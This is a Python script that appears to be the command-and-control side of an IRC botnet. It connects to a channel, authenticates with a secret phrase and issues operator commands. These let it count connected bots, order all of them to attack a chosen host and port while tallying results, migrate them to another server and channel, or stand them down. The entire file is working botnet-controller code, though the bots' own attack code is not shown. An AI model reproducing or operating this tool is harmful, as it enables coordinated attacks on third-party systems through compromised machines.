import sys, os
import socket
import select
import signal


try:
    hostname = sys.argv[1]
    port = int(sys.argv[2])
    channel = sys.argv[3]
    secretphase = sys.argv[4]
except:
    print("must state host name, port, channel, and secret phase\n\rexiting...", file=sys.stderr)
    sys.exit(-1)

# connect to irc
irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
irc.connect((hostname, port))
irc.setblocking(0)

# some initialising stuff
nickname = "BetterThanYou"
irc.send(bytes("USER TheController 8 * : I'm The Best\r\n", "utf-8"))
irc.send(bytes("NICK " + nickname + "\r\n", "utf-8"))
ready = select.select([irc], [], [], 1) # wait 1 second
if ready[0]:
    response = (irc.recv(1024)).decode("utf-8")
    print(response)
    while "Nickname is already in use" in response:
        nickname = "Way" + nickname
        irc.send(bytes("NICK " + nickname + "\r\n", "utf-8"))
        ready = select.select([irc], [], [], 1) # wait 1 second
        if ready[0]:
            response = (irc.recv(1024)).decode("utf-8")
        else: continue
irc.send(bytes("JOIN #" + channel + "\r\n", "utf-8"))
irc.send(bytes("PRIVMSG #" + channel + " :" + secretphase + "\r\n", "utf-8"))

minions = []
response = ""
command = ""
print("It is I, the best controller evarrr. Connecting with nick: " + nickname)
atk_count = 0
fail_count = 0

while 1:
    ready = select.select([irc], [], [], 2) # wait 2 seconds
    if ready[0]:
        response = (irc.recv(1024)).decode("utf-8")
        print(response)

    if response.split(" ", 1)[0] == "PING":
        argument = response.split(" ", 2)[1]
        irc.send(bytes("PONG " + argument + "\r\n", "utf-8"))


    command = input("State thy command> ")



    # Status
    if command == "status":
        irc.send(bytes("PRIVMSG #" + channel + " :To me, my minions\r\n", "utf-8"))
        print("Calling all of my minions to answer back to me")
        minions = []
        while 1:
            ready = select.select([irc], [], [], 2) # wait 2 seconds
            if ready[0]:
                response = (irc.recv(1024)).decode("utf-8")
                try:
                    size = len(response.split())
                    follower = response.split(" ", size)[size-1]
                    follower = follower.split(":", 2)[1]
                except:
                    print("uhhh hold on")
                    continue
                if follower.strip("\r\n") not in minions:
                    minions.append(follower.strip("\r\n"))
            else: break
        if len(minions) < 1:
            print("Where are my minions? I have none...")
        else:
            print("I have", len(minions), "minion(s) wahahaha")
            naming = ""
            for i, m in enumerate(minions):
                if i == 0:
                    naming = m
                else:
                    naming = naming + ", " + m
            print("Minions: " + naming + ".")

    # Attack
    if command.split(" ", 1)[0] == "attack":
        try:
            hostname = command.split(" ", 2)[1]
            port = command.split(" ", 3)[2]
            irc.send(bytes("PRIVMSG #" + channel + " :Attack " + hostname + " " + port + "\r\n", "utf-8"))
            # wait for bots to tell status of attack
            while 1:
                ready = select.select([irc], [], [], 5) # wait 5 seconds
                if ready[0]:
                    response = (irc.recv(1024)).decode("utf-8")
                    if "attack successful," in response:
                        attacker = response.split("!", 1)[0]
                        attacker = attacker.split(":", 2)[1]
                        size = len(response.split("= "))
                        atk_count = atk_count + int(response.split("= ", size)[size-1])
                        print(attacker + ": attack successful")
                    elif "attack unsuccessful," in response:
                        attacker = response.split("!", 1)[0]
                        attacker = attacker.split(":", 2)[1]
                        size = len(response.split("= "))
                        fail_count = fail_count + int(response.split("= ", size)[size-1])
                        print(attacker + ": attack unsuccessful")
                else: break
            print("successful attack count: " + str(atk_count) + ", unsuccessful attack count: " + str(fail_count))
        except:
            print("O M Goodnesses, do it right next time!")

    # Move
    if command.split(" ", 1)[0] == "move":
        try:
            hostname = command.split(" ", 2)[1]
            port = command.split(" ", 3)[2]
            move_channel = command.split(" ", 4)[3]
            irc.send(bytes("PRIVMSG #" + channel + " :Move " + hostname + " " + port + " " + move_channel + "\r\n", "utf-8"))
            # wait for bots to tell status of move; wait 3 seconds?
            while 1:
                ready = select.select([irc], [], [], 3) # wait 3 seconds
                if ready[0]:
                    response = (irc.recv(1024)).decode("utf-8")
                    print(response)
                    try:
                        follower = response.split("!", 1)[0]
                        follower = follower.split(":", 2)[1]
                        if "unsuccessful" in response:
                            print("Move did not work for: " + follower)
                        else:
                            print(follower + " has left forever!")
                    except exc:
                        print("bad")
                        continue
                else: break
        except:
            print("O M Goodnesses, do it right next time!")

    # Quit
    if command == "quit":
        irc.send(b"QUIT\r\n")
        sys.exit(0)

    # Shutdown
    if command == "shutdown":
        irc.send(bytes("PRIVMSG #" + channel + " :Go home, guys\r\n", "utf-8"))
